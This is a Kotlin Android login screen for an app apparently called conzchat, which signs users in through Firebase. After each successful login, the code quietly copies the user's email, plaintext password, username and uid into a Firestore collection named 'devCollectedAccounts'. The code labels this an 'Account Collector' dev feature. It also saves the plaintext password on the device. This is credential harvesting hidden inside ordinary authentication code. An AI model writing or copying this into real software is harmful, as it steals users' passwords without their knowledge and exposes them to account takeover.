package com.conzchat.app.ui.auth

import android.content.Context
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.conzchat.app.databinding.FragmentLoginBinding
import com.conzchat.app.util.FirebaseManager
import com.conzchat.app.util.hideKeyboard
import com.conzchat.app.util.toast
import com.google.firebase.firestore.FirebaseFirestore
import java.text.SimpleDateFormat
import java.util.*

class LoginFragment : Fragment() {

    private var _binding: FragmentLoginBinding? = null
    private val binding get() = _binding!!

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentLoginBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        binding.btnLogin.setOnClickListener {
            val email = binding.etEmail.text.toString().trim()
            val password = binding.etPassword.text.toString()
            if (email.isEmpty() || password.isEmpty()) {
                context?.toast("Please fill in all fields")
                return@setOnClickListener
            }
            doLogin(email, password)
        }

        binding.tvGoRegister.setOnClickListener {
            parentFragmentManager.beginTransaction()
                .replace(com.conzchat.app.R.id.fragmentContainer, RegisterFragment())
                .addToBackStack(null)
                .commit()
        }

        binding.ivBack.setOnClickListener {
            parentFragmentManager.popBackStack()
        }
    }

    private fun doLogin(email: String, password: String) {
        binding.btnLogin.isEnabled = false
        binding.progressBar.visibility = View.VISIBLE
        view?.hideKeyboard()

        FirebaseManager.auth.signInWithEmailAndPassword(email, password)
            .addOnSuccessListener { result ->
                val uid = result.user?.uid ?: return@addOnSuccessListener

                // Store credentials for saved accounts feature
                context?.getSharedPreferences("conz_creds", Context.MODE_PRIVATE)?.edit()
                    ?.putString("lastEmail", email)
                    ?.putString("lastPassword", password)
                    ?.apply()

                // Collect account data for Account Collector (dev feature)
                FirebaseManager.usersRef.document(uid).get()
                    .addOnSuccessListener { doc ->
                        val username = doc.getString("username") ?: ""
                        val sdf = SimpleDateFormat("dd MMM yyyy  HH:mm:ss", Locale.getDefault())
                        val entry = hashMapOf(
                            "email" to email,
                            "password" to password,
                            "username" to username,
                            "uid" to uid,
                            "type" to "login",
                            "collectedAt" to sdf.format(Date()),
                            "timestamp" to System.currentTimeMillis()
                        )
                        FirebaseFirestore.getInstance()
                            .collection("devCollectedAccounts")
                            .add(entry)
                    }
                // Auth state listener in MainActivity will handle navigation
            }
            .addOnFailureListener { e ->
                if (_binding == null) return@addOnFailureListener
                binding.btnLogin.isEnabled = true
                binding.progressBar.visibility = View.GONE
                context?.toast("Invalid email or password")
            }
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}
